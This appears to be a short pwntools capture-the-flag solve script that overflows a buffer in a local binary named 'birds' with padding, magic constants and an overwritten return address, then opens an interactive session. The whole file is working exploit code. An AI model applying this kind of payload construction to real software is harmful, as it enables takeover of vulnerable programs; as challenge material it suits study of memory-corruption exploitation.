#!/usr/bin/env python
from pwn import *

p = process('./birds')

payload = 'A'*40
payload += p32(0xdeadbeef)
payload += p32(0x539)
payload += p32(0x1337ca5e)
payload += p32(0xdeadc0de)
p.sendline(payload)
p.send(p32(0x8048508))

p.interactive()
